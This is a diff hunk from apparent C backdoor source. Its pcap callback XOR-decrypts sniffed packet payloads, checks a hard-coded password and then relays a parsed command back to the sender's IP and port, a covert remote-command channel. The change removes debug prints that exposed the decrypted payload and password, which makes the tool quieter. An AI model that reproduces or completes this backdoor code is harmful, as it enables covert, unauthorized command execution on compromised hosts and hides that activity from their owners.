@@ -165,23 +165,19 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	/* Decrypt the payload */
 	decrypted = xor_cipher((char *)payload, size_payload);
 	
-	printf("Decrypted: %s\n", decrypted);
 	memset(password, 0, sizeof(password));
 	if(sscanf(decrypted, "%s %d", password, &mode) < 0)
 	{
 		fprintf(stderr, "scanning error\n");
 		return;
 	}
-	
 
-	printf("Password: %s\n", password);
 	command = parse_cmd(decrypted);
 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
 	{
 		fprintf(stderr, "Password Authenticated. Executing command.\n");
 		send_command(command, ip, ntohs(tcp->th_sport));
-		printf("Sent\n");
 		free(command);
 		free(decrypted);
 		return;
